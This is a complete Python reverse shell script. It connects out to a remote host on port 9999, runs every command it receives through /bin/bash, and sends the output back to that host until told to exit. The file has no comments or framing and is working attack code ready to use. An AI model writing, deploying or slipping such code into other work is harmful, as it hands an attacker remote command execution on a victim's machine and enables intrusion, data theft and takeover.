#!/usr/bin/env python3
import os
import subprocess
import sys
import socket
target_host=""
target_port= 9999
HEADER=10

def commands():
    
    response=''
    while 'exit' not in response :
        response=str(client.recv(8024),"utf-8")  
        out=subprocess.Popen(response,shell=True,executable='/bin/bash',stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        output=str(out.stdout.read()+out.stderr.read(),"utf-8")
        out=output+os.getcwd()+" -> "
        header=f'{len(out):<{HEADER}}' 
        combinedout=header+out
        client.sendall(str.encode(combinedout))


    client.close()
    print("connection terminated ...")
    sys.exit()

client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

print("connecting to {}".format(target_host))
client.connect((target_host,target_port))
print("connected !")
commands()
